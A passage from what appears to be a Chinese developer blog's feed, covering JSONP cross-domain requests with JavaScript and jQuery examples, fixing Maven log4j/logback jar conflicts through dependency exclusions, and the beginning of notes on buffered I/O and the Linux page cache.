href="https://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html">推荐文章：说说JSON和JSONP，也许你会豁然开朗，含jQuery用例</a></p><p><strong>JSONP是怎么产生的</strong>：</p><ul><li>1、浏览器的同源策略限制，Ajax直接请求普通文件存在跨域无权限访问的问题，甭管你是静态页面、动态网页、web服务、WCF，只要是跨域请求，一律不准；<ul><li>2、不过Web页面上调用js文件时则不受是否跨域的影响（不仅如此，我们还发现凡是拥有”src”这个属性的标签都拥有跨域的能力，比如<code>、&lt;img&gt;、&lt;iframe&gt;</code>）；</li><li>3、于是可以判断，当前阶段如果想通过纯web端（ActiveX控件、服务端代理、属于未来的HTML5之Websocket等方式不算）跨域访问数据就只有一种可能，那就是在远程服务器上设法把数据装进js格式的文件里，供客户端调用和进一步处理；</li><li>4、恰巧我们已经知道有一种叫做JSON的纯字符数据格式可以简洁的描述复杂数据，更妙的是JSON还被js原生支持，所以在客户端几乎可以随心所欲的处理这种格式的数据；</li><li>5、这样子解决方案就呼之欲出了，web客户端通过与调用脚本一模一样的方式，来调用跨域服务器上动态生成的js格式文件（一般以JSON为后缀），显而易见，服务器之所以要动态生成JSON文件，目的就在于把客户端需要的数据装入进去。</li><li>6、客户端在对JSON文件调用成功之后，也就获得了自己所需的数据，剩下的就是按照自己需求进行处理和展现了，这种获取远程数据的方式看起来非常像AJAX，但其实并不一样。</li><li>7、为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作JSONP，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。</li></ul></li></ul><p><strong>具体原理：</strong></p><p>服务端提供的js脚本是动态生成的，这样调用者可以传一个参数过去告诉服务端“我想要一段调用XXX函数的js代码，请你返回给我”，于是服务器就可以按照客户端的需求来生成js脚本并响应了。</p><p><strong>JS调用实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">复制&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    &#x2F;&#x2F; 得到航班信息查询结果后的回调函数</span><br><span class="line">    var flightHandler &#x3D; function(data)&#123;</span><br><span class="line">        alert(&#39;你查询的航班结果是：票价 &#39; + data.price + &#39; 元，&#39; + &#39;余票 &#39; + data.tickets + &#39; 张。&#39;);</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F; 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）</span><br><span class="line">    var url &#x3D; &quot;http:&#x2F;&#x2F;flightQuery.com&#x2F;jsonp&#x2F;flightResult.aspx?code&#x3D;CA1998&amp;callback&#x3D;flightHandler&quot;;</span><br><span class="line">    &#x2F;&#x2F; 创建script标签，设置其属性</span><br><span class="line">    var script &#x3D; document.createElement(&#39;script&#39;);</span><br><span class="line">    script.setAttribute(&#39;src&#39;, url);</span><br><span class="line">    &#x2F;&#x2F; 把script标签加入head，此时调用开始</span><br><span class="line">    document.getElementsByTagName(&#39;head&#39;)[0].appendChild(script); </span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>我们看到调用的url中传递了一个code参数，告诉服务器我要查的是CA1998次航班的信息，而callback参数则告诉服务器，我的本地回调函数叫做flightHandler，所以请把查询结果传入这个函数中进行调用。<br>OK，服务器很聪明，这个叫做flightResult.aspx的页面生成了一段这样的代码提供给jsonp.html（服务端的实现这里就不演示了，与你选用的语言无关，说到底就是拼接字符串）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">复制flightHandler(&#123;</span><br><span class="line">    &quot;code&quot;: &quot;CA1998&quot;,</span><br><span class="line">    &quot;price&quot;: 1780,</span><br><span class="line">    &quot;tickets&quot;: 5</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>我们看到，传递给flightHandler函数的是一个json，它描述了航班的基本信息。运行一下页面，成功弹出提示窗口，jsonp的执行全过程顺利完成！</p><p><strong>JQuery调用实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">复制&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line"> &lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; &gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;title&gt;Untitled Page&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">      &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">     jQuery(document).ready(function()&#123; </span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">             type: &quot;get&quot;,</span><br><span class="line">             async: false,</span><br><span class="line">             url: &quot;http:&#x2F;&#x2F;flightQuery.com&#x2F;jsonp&#x2F;flightResult.aspx?code&#x3D;CA1998&quot;,</span><br><span class="line">             dataType: &quot;jsonp&quot;,</span><br><span class="line">             jsonp: &quot;callback&quot;,&#x2F;&#x2F;传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)</span><br><span class="line">             jsonpCallback:&quot;flightHandler&quot;,&#x2F;&#x2F;自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写&quot;?&quot;，jQuery会自动为你处理数据</span><br><span class="line">             success: function(json)&#123;</span><br><span class="line">                 alert(&#39;您查询到航班信息：票价： &#39; + json.price + &#39; 元，余票： &#39; + json.tickets + &#39; 张。&#39;);</span><br><span class="line">             &#125;,</span><br><span class="line">             error: function()&#123;</span><br><span class="line">                 alert(&#39;fail&#39;);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">     &#125;);</span><br><span class="line">     &lt;&#x2F;script&gt;</span><br><span class="line">     &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>是不是有点奇怪？为什么我这次没有写flightHandler这个函数呢？而且竟然也运行成功了！哈哈，这就是jQuery的功劳了，jquery在处理jsonp类型的ajax时（还是忍不住吐槽，虽然jquery也把jsonp归入了ajax，但其实它们真的不是一回事儿），自动帮你生成回调函数并把数据取出来供success属性方法来调用，是不是很爽呀？</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决jar包冲突的简单办法</title>
      <link href="/resolution%20jar%20rejected/"/>
      <url>/resolution%20jar%20rejected/</url>
      
        <content type="html"><![CDATA[<p>解决jar包冲突的简单办法– 在使用log4j.properties时，pom中导入的一些jar会产生log4j类的冲突报错，以下是一个简单的pom配置：</p><a id="more"></a><h1 id="解决jar包冲突的简单办法"><a href="#解决jar包冲突的简单办法" class="headerlink" title="解决jar包冲突的简单办法"></a>解决jar包冲突的简单办法</h1><p>场景：在使用log4j.properties时，pom中导入的一些jar会产生log4j类的冲突报错，以下是一个简单的pom配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">复制&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;&#x2F;artifactId&gt;</span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-quartz&lt;&#x2F;artifactId&gt;</span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.kudu&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;kudu-client&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.hbase&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;hbase-client&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.5.6&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.fasterxml.jackson.core&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jackson-databind&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.10.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.nari&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;front-param&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9&lt;&#x2F;version&gt;</span><br><span class="line"></span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.oracle&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;ojdbc6&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;11.2.0.1.0&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.projectlombok&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;lombok&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;optional&gt;true&lt;&#x2F;optional&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        &lt;dependency&gt;--&gt;</span><br><span class="line">&lt;!--            &lt;groupId&gt;com.alibaba.boot&lt;&#x2F;groupId&gt;--&gt;</span><br><span class="line">&lt;!--            &lt;artifactId&gt;nacos-discovery-spring-boot-starter&lt;&#x2F;artifactId&gt;--&gt;</span><br><span class="line">&lt;!--            &lt;version&gt;0.2.4&lt;&#x2F;version&gt;--&gt;</span><br><span class="line">&lt;!--        &lt;&#x2F;dependency&gt;--&gt;</span><br><span class="line">    &lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><p>运行项目会出现一下冲突：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200519094027451.png" alt="image-20200519094027451"></p><p>这里提示org-slf4j 冲突； 使用mvn dependency:tree 查看依赖树：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制mvn dependency:tree &gt; tree.txt</span><br></pre></td></tr></table></figure><p>tree.txt:(信息比较多，就截取一点。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">复制</span><br><span class="line">[INFO] com.nari:bgservice-task:jar:1.2.1</span><br><span class="line">[INFO] +- org.springframework.boot:spring-boot-starter-data-redis-reactive:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  \- org.springframework.boot:spring-boot-starter-data-redis:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |     +- org.springframework.data:spring-data-redis:jar:2.0.9.RELEASE:compile</span><br><span class="line">[INFO] |     |  +- org.springframework.data:spring-data-keyvalue:jar:2.0.9.RELEASE:compile</span><br><span class="line">[INFO] |     |  \- org.springframework:spring-oxm:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |     \- io.lettuce:lettuce-core:jar:5.0.4.RELEASE:compile</span><br><span class="line">[INFO] |        \- io.projectreactor:reactor-core:jar:3.1.8.RELEASE:compile</span><br><span class="line">[INFO] |           \- org.reactivestreams:reactive-streams:jar:1.0.2:compile</span><br><span class="line">[INFO] +- org.springframework.boot:spring-boot-starter-quartz:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  +- org.springframework.boot:spring-boot-starter:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- org.springframework.boot:spring-boot:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- org.springframework.boot:spring-boot-autoconfigure:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- org.springframework.boot:spring-boot-starter-logging:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  |  +- ch.qos.logback:logback-classic:jar:1.2.3:compile</span><br><span class="line">[INFO] |  |  |  |  \- ch.qos.logback:logback-core:jar:1.2.3:compile</span><br><span class="line">[INFO] |  |  |  +- org.apache.logging.log4j:log4j-to-slf4j:jar:2.10.0:compile</span><br><span class="line">[INFO] |  |  |  |  \- org.apache.logging.log4j:log4j-api:jar:2.10.0:compile</span><br><span class="line">[INFO] |  |  |  \- org.slf4j:jul-to-slf4j:jar:1.7.25:compile</span><br><span class="line">[INFO] |  |  +- javax.annotation:javax.annotation-api:jar:1.3.2:compile</span><br><span class="line">[INFO] |  |  +- org.springframework:spring-core:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |  |  \- org.springframework:spring-jcl:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |  \- org.yaml:snakeyaml:jar:1.19:runtime</span><br><span class="line">[INFO] |  +- org.springframework:spring-context-support:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- org.springframework:spring-beans:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |  \- org.springframework:spring-context:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |     \- org.springframework:spring-expression:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  +- org.springframework:spring-tx:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  \- org.quartz-scheduler:quartz:jar:2.3.0:compile</span><br><span class="line">[INFO] |     \- com.mchange:mchange-commons-java:jar:0.2.11:compile</span><br><span class="line">[INFO] +- org.springframework.boot:spring-boot-starter-data-jpa:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  +- org.springframework.boot:spring-boot-starter-aop:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- org.springframework:spring-aop:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  |  \- org.aspectj:aspectjweaver:jar:1.8.13:compile</span><br><span class="line">[INFO] |  +- org.springframework.boot:spring-boot-starter-jdbc:jar:2.0.4.RELEASE:compile</span><br><span class="line">[INFO] |  |  +- com.zaxxer:HikariCP:jar:2.7.9:compile</span><br><span class="line">[INFO] |  |  \- org.springframework:spring-jdbc:jar:5.0.8.RELEASE:compile</span><br><span class="line">[INFO] |  +- org.hibernate:hibernate-core:jar:5.2.17.Final:compile</span><br><span class="line">[INFO] |  |  +- org.jboss.logging:jboss-logging:jar:3.3.2.Final:compile</span><br><span class="line">[INFO] |  |  +- org.hibernate.javax.persistence:hibernate-jpa-2.1-api:jar:1.0.2.Final:compile</span><br><span class="line">[INFO] |  |  +- org.javassist:javassist:jar:3.22.0-GA:compile</span><br><span class="line">[INFO] |  |  +- antlr:antlr:jar:2.7.7:compile</span><br><span class="line">[INFO] |  |  +- org.jboss:jandex:jar:2.0.3.Final:compile</span><br><span class="line">[INFO] |  |  +- com.fasterxml:classmate:jar:1.3.4:compile</span><br><span class="line">[INFO] |  |  +- dom4j:dom4j:jar:1.6.1:compile</span><br><span class="line">[INFO] |  |  \- org.hibernate.common:hibernate-commons-</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>看到这里发现不是方便查找需要的jar包，这里可以使用mvn dependency:tree -Dincludes 限制；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制mvn dependency:tree -Dincludes&#x3D;org.slf4j</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200519112242971.png" alt="image-20200519112242971"></p><p>从图中发现org-slf4j的版本是一样的，先不管这个，先排除所有试试；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">复制&lt;dependency&gt;</span><br><span class="line">           &lt;groupId&gt;org.apache.zookeeper&lt;&#x2F;groupId&gt;</span><br><span class="line">           &lt;artifactId&gt;zookeeper&lt;&#x2F;artifactId&gt;</span><br><span class="line">           &lt;version&gt;3.5.6&lt;&#x2F;version&gt;</span><br><span class="line">           &lt;exclusions&gt;</span><br><span class="line">               &lt;exclusion&gt;</span><br><span class="line">                   &lt;groupId&gt;org.slf4j&lt;&#x2F;groupId&gt;</span><br><span class="line">                   &lt;artifactId&gt;slf4j-log4j12&lt;&#x2F;artifactId&gt;</span><br><span class="line">               &lt;&#x2F;exclusion&gt;</span><br><span class="line">               &lt;exclusion&gt;</span><br><span class="line">                   &lt;groupId&gt;log4j&lt;&#x2F;groupId&gt;</span><br><span class="line">                   &lt;artifactId&gt;log4j&lt;&#x2F;artifactId&gt;</span><br><span class="line">               &lt;&#x2F;exclusion&gt;</span><br><span class="line">           &lt;&#x2F;exclusions&gt;</span><br><span class="line">       &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>再次运行 如果发现依然报错：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200519112516682.png" alt="image-20200519112516682"></p><p>再次寻找冲突问题：</p><p>这次把焦点放在logback上；</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">复制mvn dependency:tree -Dverbose -Dincludes&#x3D;ch.qos.logback</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200519112939624.png" alt="image-20200519112939624"></p><p>发现这个logback 1.2.3的包，将其排除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">复制&lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;spring-boot-starter-quartz&lt;&#x2F;artifactId&gt;</span><br><span class="line">          &lt;exclusions&gt;</span><br><span class="line">              &lt;exclusion&gt;</span><br><span class="line">                  &lt;groupId&gt;ch.qos.logback&lt;&#x2F;groupId&gt;</span><br><span class="line">                  &lt;artifactId&gt;logback-classic&lt;&#x2F;artifactId&gt;</span><br><span class="line">              &lt;&#x2F;exclusion&gt;</span><br><span class="line">          &lt;&#x2F;exclusions&gt;</span><br><span class="line">      &lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>此次运行将正常运行不在报jar报冲突；；</p><p>处理jar冲突：</p><blockquote><p>简介:处理jar包依赖冲突,首先,对于多个jar包都引用同一jar包的情况,最好是在程序中显式定义被共同引用的jar包的依赖,来统一版本号,方便维护</p><p>如果A和B都依赖同一jar包C,可能会出现两种情况</p><p>1.A和B引用的C版本相同,这时按照pom定义顺序选择第一个即可,没有冲突问题,如果在项目的maven中显示定义了C依赖,那么用选择项目定义的依赖,反正version都一样,没有影响</p><p>2.A和B依赖的C版本不同,选择版本高的那个,这时会出现两种结果</p><p>(1) 高版本兼容低版本,所以不会出现问题</p><p>(2)高版本不兼容低版本,假如A依赖C2版本,B依赖C3版本,C3不兼容C2,maven选择了高版本C3,对A来说会出现问题</p><p>有3种解决方法</p><p>　　[1]提升A版本,找到依赖C3的A版本</p><p>　　[2]如果B版本也可依赖C2,在项目的maven中显示定义对C2的依赖,这样所有都使用C2版本</p><p>　　[3]如果B版本不支持C2版本,只能降低B版本,找到依赖C2的B版本</p><p>　　从功能性和可维护性考虑,高版本提供的功能更多,bug更少,优先考虑1</p><p>　　再考虑2</p><p>　　最后考虑3</p></blockquote><ul><li><strong>作者:</strong> MysticalYcc</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统+网络</title>
      <link href="/some%20books%20for%20me/"/>
      <url>/some%20books%20for%20me/</url>
      
        <content type="html"><![CDATA[<p>最近在读一本&lt;&lt;软件架构设计:大型网站技术架构与业务融合之道&gt;&gt;,它就像是把你平时一点点积累的知识有条理且有深度的整合。一步一步的将读者断断续续的知识接起来。以下文章是记录书本中的一些知识并加以拓展。</p><a id="more"></a><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>对于开发者来说，I/O 是绕不过去的一个基本问题。从文件 I/O 到网络 I/O，存在着各式各样的概念和 I/O 模型，所以这里首先把涉及 I/O 的各种概念和原理厘清。</p><h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><p>先了解几个概念；</p><p><strong>应用程序内存</strong>：是通常写代码用 malloc/free、new/delete 等分配出来的内存。</p><p><strong>用户缓冲区</strong>：C 语言的 FILE 结构体里面的 buffer。FILE 结构体的定义如下，可以看到里面有定义的 buffer；</p><p><strong>内核缓冲区</strong>：Linux 操作系统的 Page Cache。为了加快磁盘的 I/O，Linux 系统会把磁盘上的数据以 Page 为单位缓存在操作系统的内存里，这里的 Page 是 Linux 系统定义的一个逻辑概念，一个 Page 一般为 4K。</p><h3 id="缓存-I-O-Buffered-I-O-直接IO"><a href="#缓存-I-O-Buffered-I-O-直接IO" class="headerlink" title="缓存 I/O (Buffered I/O)/直接IO"></a>缓存 I/O (Buffered I/O)/直接IO</h3><p>缓存 I/O 又被称作标准 I/O，大多数文件系统的默认 I/O 操作都是缓存 I/O。在 Linux 的缓存 I/O 机制中，操作系统会将 I/O 的数据缓存在文件系统的页缓存（ page cache ）中，也就是说，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。缓存 I/O 有以下这些优点：</p><ul><li>缓存 I/O 使用了操作系统内核缓冲区，在一定程度上分离了应用程序空间和实际的物理设备。</li><li>缓存 I/O 可以减少读盘的次数，从而提高性能。</li></ul><p>当应用程序尝试读取某块数据的时候，如果这块数据已经存放在了页缓存中，那么这块数据就可以立即返回给应用程序，而不需要经过实际的物理读盘操作。当然，如果数据在应用程序读取之前并未被存放在页缓存中，那么就需要先将数据从磁盘读到页缓存中去。对于写操作来说，应用程序也会将数据先写到页缓存中去，数据是否被立即写到磁盘上去取决于应用程序所采用的写操作机制：如果用户采用的是同步写机制（ synchronous writes ）, 那么数据会立即被写回到磁盘上，应用程序会一直等到数据被写完为止；如果用户采用的是延迟写机制（ deferred writes ），那么应用程序就完全不需要等到数据全部被写回到磁盘，数据只要被写到页缓存中去就可以了。在延迟写机制的情况下，操作系统会定期地将放在页缓存中的数据刷到磁盘上。与异步写机制（ asynchronous writes ）不同的是，延迟写机制在数据完全写到磁盘上的时候不会通知应用程序，而异步写机制在数据完全写到磁盘上的时候是会返回给应用程序的。所以延迟写机制本身是存在数据丢失的风险的，而异步写机制则不会有这方面的担心。</p><p>在缓存 I/O 机制中，DMA 方式可以将数据直接从磁盘读到页缓存中，或者将数据从页缓存直接写回到磁盘上，而不能直接在应用程序地址空间和磁盘之间进行数据传输，这样的话，数据在传输过程中需要在应用程序地址空间和页缓存之间进行多次数据拷贝操作，这些数据拷贝操作所带来的 CPU 